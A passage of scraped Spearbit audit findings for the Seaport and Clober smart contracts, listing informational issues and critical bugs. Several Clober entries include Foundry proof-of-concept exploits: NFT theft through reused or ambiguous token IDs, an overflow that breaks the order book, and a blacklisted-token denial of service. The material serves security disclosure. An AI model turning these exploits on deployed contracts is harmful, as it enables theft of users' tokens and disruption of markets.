"https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "ConsiderationErrors.sol is a new file and is untested. Writing test cases to make sure the revert functions are throwing the right errors is an easy way to prevent mistakes.", "labels": ["Spearbit", "Seaport", "Severity: Informational"]}, {"title": "Typo in comment for the selector used in ConsiderationEncoder.sol#abi_encode_validateOrder()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "Minor typo in comments: // Write ratifyOrder selector and get pointer to start of calldata dst.write(validateOrder_selector);", "labels": ["Spearbit", "Seaport", "Severity: Informational"]}, {"title": "_contractNonces[offerer] gets incremented even if the generateOrder(...)'s return data does not satisfy all the constrainsts.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "_contractNonces[offerer] gets incremented even if the generateOrder(...)'s return data does not satisfy all the constraints. This is the case when errorBuffer !=0 and revertOnInvalid == false (ful- fillAvailableOrders, fulfillAvailableAdvancedOrders). In this case, Seaport would not call back into the contract offerer's ratifyOrder(...) endpoint. Thus, the next time this offerer receives a ratifyOrder(...) call from Seaport, the nonce shared with it might have incremented more than 1.", "labels": ["Spearbit", "Seaport", "Severity: Informational"]}, {"title": "Users need to be cautious about what proxied/modified Seaport or Conduit instances they approve their tokens to", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "Seaport ( S ) uses EIP-712 domain separator to make sure that when users sign orders, the signed orders only apply to that specific Seaport by pinpointing its name, version, the chainid, and its address. The domain separator is calculated and cached once the Seaport contract gets deployed. The domain separator only gets recalculated when/if the chainid changes (in the case of a hard fork for example). Some actors can take advantage of this caching mechanism by deploying a contract ( S0 ) that :  Delegates some of its endpoints to Seaport or it's just a proxy contract.  Its codebase is almost identical to Seaport except that the domain separator actually replicates what the original Seaport is using. This only requires 1 or 2 lines of code change (in this case the caching mechanism is not important) function _deriveDomainSeparator() { ... // Place the address of this contract in the next memory location. mstore(FourWords, MAIN_SEAPORT_ADDRESS) // <--- modified line and perhaps the actor can define a ,! named constant Assume a user approves either: 1. Both the original Seaport instance and the modified/proxied instance or, 2. A conduit that has open channels to both the original Seaport instance and the modified/proxied instance. And signs an order for the original Seaport that in the 1st case doesn't use any conduits or in the 2nd case the order uses the approved conduit with 2 open channels. Then one can use the same signature once with the original Seaport and once with the modified/proxied one to receive more tokens than offerer / user originally had intended to sell.", "labels": ["Spearbit", "Seaport", "Severity: Informational"]}, {"title": "ZoneInteraction contains logic for both zone and contract offerers", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "ZoneInteraction contains logic for both zone and contract offerers.", "labels": ["Spearbit", "Seaport", "Severity: Informational"]}, {"title": "Orders of CONTRACT order type can lower the value of a token offered", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "Sometimes tokens have extra value because of the derived tokens owned by them (for example an accessory for a player in a game). With the introduction of contract offerer, one can create a contract offerer that automatically lowers the value of a token, for example, by transferring the derived connected token to a different item when Seaport calls the generateOrder(...). When such an order is included in a collection of orders the only way to ensure that the recipient of the item will hold a token which value hasn't depreciated during the transaction is that the recipient would also need to use a kind of mirrored order that incorporates either a CONTRACT or restricted order type that can do a post-transfer check.", "labels": ["Spearbit", "Seaport", "Severity: Informational"]}, {"title": "Restricted order checks in case where offerer and the fulfiller are the same", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "Seaport 1.2 disallowed skipping restricted order checks when offerrer and fulfiller are the same.  Remove special-casing for offerer-fulfilled restricted orders: Offerers may currently bypass restricted order checks when fulfilling their own orders. This complicates reasoning about restricted order validation, can aid in the deception of other offerers or fulfillers in some unusual edge cases, and serves little practical use. However, in the case of the offerer == fulfiller == zone, the check continues to be skipped.", "labels": ["Spearbit", "Seaport", "Severity: Informational"]}, {"title": "Clean up inline documentation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "The comments highlighted in Context need to be removed or updated.  Remove the following: 73 ConsiderationEncoder.sol:216: // @todo Dedupe some of this ConsiderationEncoder.sol:316: // @todo Dedupe some of this ZoneInteraction.sol:97: // bytes memory callData; ZoneInteraction.sol:100: // function(bytes32) internal view errorHandler; ZoneInteraction.sol:182: // let magicValue := shr(224, mload(callData))  ConsiderationStructs.sol#L167 and ZoneInteraction.sol#L82 contain an outdated comment about the extraData attribute. There is no longer a staticcall being done, and the function isValidOrderIn- cludingExtraData no longer exists.  The NatSpec comment for _assertRestrictedAdvancedOrderValidity mentions: /** * @dev Internal view function to determine whether an order is a restricted * * * * * order and, if so, to ensure that it was either submitted by the offerer or the zone for the order, or that the zone returns the expected magic value upon performing a staticcall to `isValidOrder` or `isValidOrderIncludingExtraData` depending on whether the order fulfillment specifies extra data or criteria resolvers. A few of the facts are not correct anymore: * This function is not a view function anymore and change the storage state either for a zone or a contract offerer. * It is not only for restricted orders but also applies to orders of CONTRACT order type. * It performs actuall calls and not staticcalls anymore. * it calls the isValidOrder endpoint of a zone or the ratifyOrder endpoint of a contract offerer depending on the order type. * If it is dealing with a restricted order, the check is only skipped if the msg.sender is the zone. Seaport is called by the offerer for a restricted order, the call to the zone is still performed. If  Same comments apply to _assertRestrictedBasicOrderValidity excluding the case when order is of CONTRACT order type.  Typos in TransferHelperErrors.sol - * @dev Revert with an error when a call to a ERC721 receiver reverts with + * @dev Revert with an error when a call to an ERC721 receiver reverts with  The @ NatSpec fields have an extra space in Consideration.sol: * @ <field> The extra space can be removed.", "labels": ["Spearbit", "Seaport", "Severity: Informational"]}, {"title": "Consider writing tests for hard coded constants in ConsiderationConstants.sol", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "There are many hard coded constants, most being function selectors, that should be tested against.", "labels": ["Spearbit", "Seaport", "Severity: Informational"]}, {"title": "Unused / Redundant imports in ZoneInteraction.sol", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "There are multiple unused / redundant imports.", "labels": ["Spearbit", "Seaport", "Severity: Informational"]}, {"title": "Orders of CONTRACT order type do not enforce a usage of a specific conduit", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "None of the endpoints (generateOrder and ratifyOrder) for an order of CONTRACT order type en- force using a specific conduit. A contract offerer can enforce the usage of a specific conduit or just Seaport by setting allowances or approval for specific tokens. If a caller calls into different Seaport endpoints and does not provide the correct conduit key, then the order would revert. Currently, the ContractOffererInterface interface does not have a specific endpoint to discover which conduits the contract offerer would prefer users to use. getMetadata() would be able to return a metadata that encodes the conduit key. For (advanced) orders of not CONTRACT order types, the offerer would sign the order and the conduit key is included in the signed hash. Thus, the conduit is enforced whenever that order gets included in a collection by an actor calling Seaport.", "labels": ["Spearbit", "Seaport", "Severity: Informational"]}, {"title": "Calls to Seaport that would fulfill or match a collection of advanced orders can be front-ran to claim any unused offer items", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "Calls to Seaport that would fulfill or match a collection of advanced orders can be front-ran to claim any unused offer items. These endpoints include:  fulfillAvailableOrders  fulfillAvailableAdvancedOrders  matchOrders  matchAdvancedOrders Anyone can monitor the mempool to find calls to the above endpoints and calculate if there are any unused offer item amounts. If there are unused offer item amounts, the actor can create orders with no offer items, but with consideration items mirroring the unused offer items and populate the fulfillment aggregation data to match the 84 unused offer items with the new mirrored consideration items. It is possible that the call by the actor would be successful under certain conditions. For example, if there are orders of CONTRACT order type involved, the contract offerer might reject this actor (the rejection might also happen by the zones used when validating the order). But in general, this strategy can be implemented by anyone.", "labels": ["Spearbit", "Seaport", "Severity: Informational"]}, {"title": "Advance orders of CONTRACT order types can generate orders with more offer items and the extra offer items might not end up being used.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "When Seaport gets a collection of advanced orders to fulfill or match, if one of the orders has a CON- TRACT order type, Seaport calls the generateOrder(...) endpoint of that order's offerer. generateOrder(...) can provide extra offer items for this order. These extra offer items might have not been known beforehand by the caller. And if the caller would not incorporate the indexes for the extra items in the fulfillment aggregation data, the extra items would end up not being aggregated into any executions.", "labels": ["Spearbit", "Seaport", "Severity: Informational"]}, {"title": "Typo for the index check comment in _aggregateValidFulfillmentConsiderationItems", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "There is a typo in _aggregateValidFulfillmentConsiderationItems: // Retrieve item index using an offset of the fulfillment pointer. let itemIndex := mload( add(mload(fulfillmentHeadPtr), Fulfillment_itemIndex_offset) ) // Ensure that the order index is not out of range. <---------- the line with typo if iszero(lt(itemIndex, mload(considerationArrPtr))) { throwInvalidFulfillmentComponentData() } The itemIndex above refers to the index in consideration array and not the order.", "labels": ["Spearbit", "Seaport", "Severity: Informational"]}, {"title": "Document the unused parameters for orders of CONTRACT order type", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "If an advance order advancedOrder is of CONTRACT order type, certain parameters are not being used in the code base, specifically:  numerator: only used for skipping certain operations (see AdvancedOrder.numerator and AdvancedOrder.denominator are unchecked for orders of CONTRACT order type)  denominator: --  signature: --  parameters.zone: only used when emitting the OrderFulfilled event.  parameters.offer.endAmount: endAmount and startAmount for offer items will be set to the amount sent back by generateOrder for the corresponding item.  parameters.consideration.endAmount: endAmount and startAmount for consideration items will be set to the amount sent back by generateOrder for the corresponding item  parameters.consideration.recipient: the offerer contract returns new recipients when generateOrder gets called  parameters.zoneHash: --  parameters.salt: --  parameters.totalOriginalConsiderationItems: --", "labels": ["Spearbit", "Seaport", "Severity: Informational"]}, {"title": "The check against totalOriginalConsiderationItems is skipped for orders of CONTRACT order type", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "compares dOrder.parameters.consideration.length: The AdvancedOrder.parameters.totalOriginalConsiderationItems inequality following skipped orders for of is CONTRACT order with type which Advance- // Ensure supplied consideration array length is not less than the original. if (suppliedConsiderationItemTotal < originalConsiderationItemTotal) { _revertMissingOriginalConsiderationItems(); }", "labels": ["Spearbit", "Seaport", "Severity: Informational"]}, {"title": "getOrderStatus returns the default values for orderHash that is derived for orders of CONTRACT order type", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "Since the _orderStatus[orderHash] does not get set for orders of CONTRACT order type, getOrder- Status would always returns (false, false, 0, 0) for those hashes (unless there is a hash collision with other types of orders)", "labels": ["Spearbit", "Seaport", "Severity: Informational"]}, {"title": "validate skips CONTRACT order types but cancel does not", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "When validating orders validate skips any order of CONTRACT order type, but cancel does not skip these order types. When fulfilling or matching orders for CONTRACT order types, _orderStatus does not get checked or populated. But in cancel the isValidated and the isCancelled fields get set. This is basically a no-op for these order types.", "labels": ["Spearbit", "Seaport", "Severity: Informational"]}, {"title": "The literal 0x1c used as the starting offset of a custom error in a revert statement can be replaced by the named constant Error_selector_offset", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "In the context above, 0x1c is used to signal the start of a custom error block saved in the memory: revert(0x1c, _LENGTH_) For the above literal, we also have a named constant defined in ConsiderationConstants.sol#L410: uint256 constant Error_selector_offset = 0x1c; The named constant Error_selector_offset has been used in most places that a custom error is reverted in an assembly block.", "labels": ["Spearbit", "Seaport", "Severity: Informational"]}, {"title": "OrderBook Denial of Service leveraging blacklistable tokens like USDC", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The issue was spotted while analysing additional impact and fix for 67 Proof of concept checked with the original audit commit: 28062f477f571b38fe4f8455170bd11094a71862 and the newest available commit from dev branch: 2ed4370b5de9cec5c455f5485358db194f093b01 Due to the architecture decision which implements orders queue as a cyclic buffer the OrderBook after reaching MAX_ORDERS (~32k) for a given price point, starts to overwrite stale orders. If an order was never claimed or it is broken, so it cannot be claimed, it is not possible to place a new order in a queue. This emerges due to a fact that it is not possible to finalize the stale order and deliver the underlying assets, what is done while placing a new and replacing a stale order. Effectively this issue can be used to block the main functionality of the OrderBook, so placing new orders for a given price point. Only a single broken order per price-point is enough to lead to this condition. The issue will not be immediately visible as it requires the cyclic buffer to make a circle and encounter the broken order. The proof of concept in SecurityAuditTests.sol attachment implements a simple scenario where a USDC-like mock token is used: 1. Mallory creates one ASK order at some price point (to sell X base tokens for Y quoteTokens). 2. Mallory transfers ownership of the OrderNFT token to an address which is blacklisted by quoteToken (e.g. USDC) 3. Orders queue implemented as a circular buffer over time overflows and starts replacing old orders. 4. When it is the time to replace the order the quoteToken is about to be transferred, but due to the blacklist the assets cannot be delivered. 5. At this point it is impossible to place new orders at this price index, unless the owner of the OrderNFT transfers it to somebody who can receive quoteToken. Proof of concept result for the newest 2ed4370b5de9cec5c455f5485358db194f093b01 commit: # $ git clone ... && git checkout 2ed4370b5de9cec5c455f5485358db194f093b01 # $ forge test -m \"test_security_BlockOrderQueueWithBlacklistableToken\" [25766] MockOrderBook::limitOrder(0x0000000000000000000000000000000000004444, 3, 0, ,! 333333333333333334, 2, 0x) [8128] OrderNFT::onBurn(false, 3, 0) [1448] MockOrderBook::getOrder((false, 3, 0)) [staticcall]  (1, 0, 0x00000000000000000000000000000000DeaDBeef) emit Approval(owner: 0x00000000000000000000000000000000DeaDBeef, approved: 0x0000000000000000000000000000000000000000, tokenId: 20705239040371691362304267586831076357353326916511159665487572671397888) emit Transfer(from: 0x00000000000000000000000000000000DeaDBeef, to: 0x0000000000000000000000000000000000000000, tokenId: 20705239040371691362304267586831076357353326916511159665487572671397888)  () emit ClaimOrder(claimer: 0x0000000000000000000000000000000000004444, user: 0x00000000000000000000000000000000DeaDBeef, rawAmount: 1, bountyAmount: 0, orderIndex: 0, priceIndex: 3, isBase: false) [714] MockSimpleBlockableToken::transfer(0x00000000000000000000000000000000DeaDBeef, 10000) ,! ,! ,! ,! ,! ,!  \"blocked\"  \"blocked\"  \"blocked\" 5 In real life all *-USDC and USDC-* pairs as well as other pairs where a single token implements a block list are affected. The issue is also appealing to the attacker as at any time if the attacker controls the blacklisted wallet address, he/she can transfer the unclaimable OrderNFT to a whitelisted address to claim his/her assets and to enable processing until the next broken order is placed in the cyclic buffer. It can be used either to manipulate the market by blocking certain types of orders per given price points or simply to blackmail the DAO to resume operations.", "labels": ["Spearbit", "Clober", "Severity: Critical Risk"]}, {"title": "Overflow in SegmentedSegmentTree464", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "SegmentedSegmentTree464.update needs to perform an overflow check in case the new value is greater than the old value. This overflow check is done when adding the new difference to each node in each layer (using addClean). Furthermore, there's a final overflow check by adding up all nodes in the first layer in total(core). However, in total, the nodes in individual groups are added using DirtyUint64.sumPackedUnsafe: function total(Core storage core) internal view returns (uint64) { return DirtyUint64.sumPackedUnsafe(core.layers[0][0], 0, _C) + DirtyUint64.sumPackedUnsafe(core.layers[0][1], 0, _C); } The nodes in a group can overflow without triggering an overflow & revert. The impact is that the order book depth and claim functionalities break for all users. 6 // SPDX-License-Identifier: BUSL-1.1 pragma solidity ^0.8.0; import \"forge-std/Test.sol\"; import \"forge-std/StdJson.sol\"; import \"../../contracts/mocks/SegmentedSegmentTree464Wrapper.sol\"; contract SegmentedSegmentTree464Test is Test { using stdJson for string; uint32 private constant _MAX_ORDER = 2**15; SegmentedSegmentTree464Wrapper testWrapper; function setUp() public { testWrapper = new SegmentedSegmentTree464Wrapper(); } function testTotalOverflow() public { uint64 half64 = type(uint64).max / 2 + 1; testWrapper.update(0, half64); // map to the right node of layer 0, group 0 testWrapper.update(_MAX_ORDER / 2 - 1, half64); assertEq(testWrapper.total(), 0); } }", "labels": ["Spearbit", "Clober", "Severity: Critical Risk"]}, {"title": "OrderNFT theft due to controlling future and past tokens of same order index", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The order queue is implemented as a ring buffer, to get an order (Orderbook.getOrder) the index in the queue is computed as orderIndex % _MAX_ORDER. The owner of an OrderNFT also uses this function. function _getOrder(OrderKey calldata orderKey) internal view returns (Order storage) { return _getQueue(orderKey.isBid, orderKey.priceIndex).orders[orderKey.orderIndex & _MAX_ORDER_M]; } CloberOrderBook(market).getOrder(decodeId(tokenId)).owner Therefore, the current owner of the NFT of orderIndex also owns all NFTs with orderIndex + k * _MAX_ORDER. An attacker can set approvals of future token IDs to themself. These approvals are not cleared on OrderNFT.onMint when a victim mints this future token ID, allowing the attacker to steal the NFT and cancel the NFT to claim their tokens. 7 // SPDX-License-Identifier: BUSL-1.1 pragma solidity ^0.8.0; import \"forge-std/Test.sol\"; import \"../../../../contracts/interfaces/CloberMarketSwapCallbackReceiver.sol\"; import \"../../../../contracts/mocks/MockQuoteToken.sol\"; import \"../../../../contracts/mocks/MockBaseToken.sol\"; import \"../../../../contracts/mocks/MockOrderBook.sol\"; import \"../../../../contracts/markets/VolatileMarket.sol\"; import \"../../../../contracts/OrderNFT.sol\"; import \"../utils/MockingFactoryTest.sol\"; import \"./Constants.sol\"; contract ExploitsTest is Test, CloberMarketSwapCallbackReceiver, MockingFactoryTest { struct Return { address tokenIn; address tokenOut; uint256 amountIn; uint256 amountOut; uint256 refundBounty; } struct Vars { uint256 inputAmount; uint256 outputAmount; uint256 beforePayerQuoteBalance; uint256 beforePayerBaseBalance; uint256 beforeTakerQuoteBalance; uint256 beforeOrderBookEthBalance; } MockQuoteToken quoteToken; MockBaseToken baseToken; MockOrderBook orderBook; OrderNFT orderToken; function setUp() public { quoteToken = new MockQuoteToken(); baseToken = new MockBaseToken(); } function cloberMarketSwapCallback( address tokenIn, address tokenOut, uint256 amountIn, uint256 amountOut, bytes calldata data ) external payable { if (data.length != 0) { Return memory expectedReturn = abi.decode(data, (Return)); assertEq(tokenIn, expectedReturn.tokenIn, \"ERROR_TOKEN_IN\"); assertEq(tokenOut, expectedReturn.tokenOut, \"ERROR_TOKEN_OUT\"); assertEq(amountIn, expectedReturn.amountIn, \"ERROR_AMOUNT_IN\"); assertEq(amountOut, expectedReturn.amountOut, \"ERROR_AMOUNT_OUT\"); assertEq(msg.value, expectedReturn.refundBounty, \"ERROR_REFUND_BOUNTY\"); } IERC20(tokenIn).transfer(msg.sender, amountIn); } 8 function _createOrderBook(int24 makerFee, uint24 takerFee) private { orderToken = new OrderNFT(); orderBook = new MockOrderBook( address(orderToken), address(quoteToken), address(baseToken), 1, 10**4, makerFee, takerFee, address(this) ); orderToken.init(\"\", \"\", address(orderBook), address(this)); uint256 _quotePrecision = 10**quoteToken.decimals(); quoteToken.mint(address(this), 1000000000 * _quotePrecision); quoteToken.approve(address(orderBook), type(uint256).max); uint256 _basePrecision = 10**baseToken.decimals(); baseToken.mint(address(this), 1000000000 * _basePrecision); baseToken.approve(address(orderBook), type(uint256).max); } function _buildLimitOrderOptions(bool isBid, bool postOnly) private pure returns (uint8) { return (isBid ? 1 : 0) + (postOnly ? 2 : 0); } uint256 private constant _MAX_ORDER = 2**15; // 32768 uint256 private constant _MAX_ORDER_M = 2**15 - 1; // % 32768 function testExploit2() public { _createOrderBook(0, 0); address attacker = address(0x1337); address attacker2 = address(0x1338); address victim = address(0xbabe); // Step 1. Attacker creates an ASK limit order and receives NFT uint16 priceIndex = 100; uint256 orderIndex = orderBook.limitOrder{value: Constants.CLAIM_BOUNTY * 1 gwei}({ user: attacker, priceIndex: priceIndex, rawAmount: 0, baseAmount: 1e18, options: _buildLimitOrderOptions(Constants.ASK, Constants.POST_ONLY), data: new bytes(0) }); // Step 2. Given the `OrderKey` which represents the created limit order, an attacker can craft ,! ambiguous tokenIds CloberOrderBook.OrderKey memory orderKey = CloberOrderBook.OrderKey({isBid: false, priceIndex: priceIndex, orderIndex: orderIndex}); uint256 currentTokenId = orderToken.encodeId(orderKey); orderKey.orderIndex += _MAX_ORDER; uint256 futureTokenId = orderToken.encodeId(orderKey); // Step 3. Attacker approves the futureTokenId to themself, and cancels the current id vm.startPrank(attacker); orderToken.approve(attacker2, futureTokenId); CloberOrderBook.OrderKey[] memory orderKeys = new CloberOrderBook.OrderKey[](1); orderKeys[0] = orderKey; orderKeys[0].orderIndex = orderIndex; // restore original orderIndex 9 orderBook.cancel(attacker, orderKeys); vm.stopPrank(); // Step 4. attacker fills queue, victim creates their order recycles orderIndex 0 uint256 victimOrderSize = 1e18; for(uint256 i = 0; i < _MAX_ORDER; i++) { orderBook.limitOrder{value: Constants.CLAIM_BOUNTY * 1 gwei}({ user: i < _MAX_ORDER - 1 ? attacker : victim, priceIndex: priceIndex, rawAmount: 0, baseAmount: victimOrderSize, options: _buildLimitOrderOptions(Constants.ASK, Constants.POST_ONLY), data: new bytes(0) }); } assertEq(orderToken.ownerOf(futureTokenId), victim); // Step 5. Attacker steals the NFT and can cancel to receive the tokens vm.startPrank(attacker2); orderToken.transferFrom(victim, attacker, futureTokenId); vm.stopPrank(); assertEq(orderToken.ownerOf(futureTokenId), attacker); uint256 baseBalanceBefore = baseToken.balanceOf(attacker); vm.startPrank(attacker); orderKeys[0].orderIndex = orderIndex + _MAX_ORDER; orderBook.cancel(attacker, orderKeys); vm.stopPrank(); assertEq(baseToken.balanceOf(attacker) - baseBalanceBefore, victimOrderSize); } }", "labels": ["Spearbit", "Clober", "Severity: Critical Risk"]}, {"title": "OrderNFT theft due to ambiguous tokenId encoding/decoding scheme", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The encodeId() uniquely encodes OrderKey to a uin256 number. However, decodeId() ambigu- ously can decode many tokenId's to the exact same OrderKey. This can be problematic due to the fact that contract uses tokenId's to store approvals. The ambiguity comes from converting uint8 value to bool isBid value here function decodeId(uint256 id) public pure returns (CloberOrderBook.OrderKey memory) { uint8 isBid; uint16 priceIndex; uint232 orderIndex; assembly { orderIndex := id priceIndex := shr(232, id) isBid := shr(248, id) } return CloberOrderBook.OrderKey({isBid: isBid == 1, priceIndex: priceIndex, orderIndex: orderIndex}); ,! } (note that the attack is possible only for ASK limit orders) 11 Proof of Concept // Step 1. Attacker creates an ASK limit order and receives NFT uint16 priceIndex = 100; uint256 orderIndex = orderBook.limitOrder{value: Constants.CLAIM_BOUNTY * 1 gwei}({ user: attacker, priceIndex: priceIndex, rawAmount: 0, baseAmount: 10**18, options: _buildLimitOrderOptions(Constants.ASK, Constants.POST_ONLY), data: new bytes(0) }); // Step 2. Given the `OrderKey` which represents the created limit order, an attacker can craft ambiguous tokenIds ,! CloberOrderBook.OrderKey memory order_key = CloberOrderBook.OrderKey({isBid: false, priceIndex: priceIndex, orderIndex: orderIndex}); ,! uint256 tokenId = orderToken.encodeId(order_key); uint256 ambiguous_tokenId = tokenId + (1 << 255); // crafting ambiguous tokenId // Step 3. Attacker approves both victim (can be a third-party protocol like OpenSea) and his other account ,! vm.startPrank(attacker); orderToken.approve(victim, tokenId); orderToken.approve(attacker2, ambiguous_tokenId); vm.stopPrank(); // Step 4. Victim transfers the NFT to the themselves. (Or attacker trades it) vm.startPrank(victim); orderToken.transferFrom(attacker, victim, tokenId); vm.stopPrank(); // Step 5. Attacker steals the NFT vm.startPrank(attacker2); orderToken.transferFrom(victim, attacker2, ambiguous_tokenId); vm.stopPrank();", "labels": ["Spearbit", "Clober", "Severity: Critical Risk"]}, {"title": "Missing owner check on from when transferring tokens", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The OrderNFT.transferFrom/safeTransferFrom use the internal _transfer function. While they check approvals on msg.sender through _isApprovedOrOwner(msg.sender, tokenId), it is never checked that the specified from parameter is actually the owner of the NFT. An attacker can decrease other users' NFT balances, making them unable to cancel or claim their NFTs and locking users' funds. The attacker transfers their own NFT passing the victim as from by calling transfer- From(from=victim, to=attackerAccount, tokenId=attackerTokenId). This passes the _isApprovedOrOwner check, but reduces from's balance.", "labels": ["Spearbit", "Clober", "Severity: High Risk"]}, {"title": "Wrong minimum net fee check", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "A minimum net fee was introduced that all markets should comply by such that the protocol earns fees. The protocol fees are computed takerFee + makerFee and the market factory computes the wrong check. Fee pairs that should be accepted are currently not accepted, and even worse, fee pairs that should be rejected are currently accepted. Market creators can avoid collecting protocol fees this way.", "labels": ["Spearbit", "Clober", "Severity: High Risk"]}, {"title": "Rounding up of taker fees of constituent orders may exceed collected fee", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "If multiple orders are taken, the taker fee calculated is rounded up once, but that of each taken maker order could be rounded up as well, leading to more fees accounted for than actually taken. Example:  takerFee = 100011 (10.0011%)  2 maker orders of amounts 400000 and 377000  total amount = 400000 + 377000 = 777000  Taker fee taken = 777000 * 100011 / 1000000 = 77708.547 = 777709 Maker fees would be 13 377000 * 100011 / 1000000 = 37704.147 = 37705 400000 * 100011 / 1000000 = 40004.4 = 40005 which is 1 wei more than actually taken. Below is a foundry test to reproduce the problem, which can be inserted into Claim.t.sol: function testClaimFeesFailFromRounding() public { _createOrderBook(0, 100011); // 10.0011% taker fee // create 2 orders uint256 orderIndex1 = _createPostOnlyOrder(Constants.BID, Constants.RAW_AMOUNT); uint256 orderIndex2 = _createPostOnlyOrder(Constants.BID, Constants.RAW_AMOUNT); // take both orders _createTakeOrder(Constants.BID, 2 * Constants.RAW_AMOUNT); CloberOrderBook.OrderKey[] memory ids = new CloberOrderBook.OrderKey[](2); ids[0] = CloberOrderBook.OrderKey({ isBid: Constants.BID, priceIndex: Constants.PRICE_INDEX, orderIndex: orderIndex1 }); ids[1] = CloberOrderBook.OrderKey({ isBid: Constants.BID, priceIndex: Constants.PRICE_INDEX, orderIndex: orderIndex2 }); // perform claim orderBook.claim( address(this), ids ); // (uint128 quoteFeeBal, uint128 baseFeeBal) = orderBook.getFeeBalance(); // console.log(quoteFeeBal); // fee accounted = 20004 // console.log(baseFeeBal); // fee accounted = 0 // console.log(quoteToken.balanceOf(address(orderBook))); // actual fee collected = 20003 // try to claim fees, will revert vm.expectRevert(\"ERC20: transfer amount exceeds balance\"); orderBook.collectFees(); }", "labels": ["Spearbit", "Clober", "Severity: High Risk"]}, {"title": "Drain tokens condition due to reentrancy in collectFees", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "collectFees function is not guarded by a re-entrancy guard. In case a transfer of at least one of the tokens in a trading pair allows to invoke arbitrary code (e.g. token implementing callbacks/hooks), it is possible for a malicious host to drain trading pools. The re-entrancy condition allows to transfer collected fees multiple times to both DAO and the host beyond the actual fee counter.", "labels": ["Spearbit", "Clober", "Severity: High Risk"]}, {"title": "Group claim clashing condition", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "Claim functionality is designed to support 3rd party operators to claim multiple orders on behalf of market's users to finalise the transactions, deliver assets and earn bounties. The code allows to iterate over a list of orders to execute _claim. function claim(address claimer, OrderKey[] calldata orderKeys) external nonReentrant revertOnDelegateCall { uint32 totalBounty = 0; for (uint256 i = 0; i < orderKeys.length; i++) { ... (uint256 claimedTokenAmount, uint256 minusFee, uint64 claimedRawAmount) = _claim( queue, mOrder, orderKey, claimer ); ... } } However, neither claim nor _claim functions in OrderBook support skipping already fulfilled orders. On the con- trary in case of a revert in _claim the whole transaction is reverted. function _claim(...) private returns (...) { ... require(mOrder.openOrderAmount > 0, Errors.OB_INVALID_CLAIM); ... } Such implementation does not support fully the initial idea of 3rd party operators claiming orders in batches. A transaction claiming multiple orders at once can easily clash with others and be reverted completely, effectively claiming nothing - just wasting gas. Clashing can happen for instance when two bots got overlapping lists of orders or when the owner of the order decides to claim or cancel his/her order manually while the bot is about to claim it as well. 15", "labels": ["Spearbit", "Clober", "Severity: Medium Risk"]}, {"title": "Order owner isn't zeroed after burning", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The order's owner is not zeroed out when the NFT is burnt. As a result, while the onBurn() method records the NFT to have been transferred to the zero address, ownerOf() still returns the current order's owner. This allows for unexpected behaviour, like being able to call approve() and safeTransferFrom() functions on non-existent tokens. A malicious actor could sell such resurrected NFTs on secondary exchanges for profit even though they have no monetary value. Such NFTs will revert on cancellation or claim attempts since openOrderAmount is zero. function testNFTMovementAfterBurn() public { _createOrderBook(0, 0); address attacker2 = address(0x1337); // Step 1: make 2 orders to avoid bal sub overflow when moving burnt NFT in step 3 uint256 orderIndex1 = _createPostOnlyOrder(Constants.BID, Constants.RAW_AMOUNT); _createPostOnlyOrder(Constants.BID, Constants.RAW_AMOUNT); CloberOrderBook.OrderKey memory orderKey = CloberOrderBook.OrderKey({ isBid: Constants.BID, priceIndex: Constants.PRICE_INDEX, orderIndex: orderIndex1 }); uint256 tokenId = orderToken.encodeId(orderKey); // Step 2: burn 1 NFT by cancelling one of the orders vm.startPrank(Constants.MAKER); orderBook.cancel( Constants.MAKER, _toArray(orderKey) ); // verify ownership is still maker 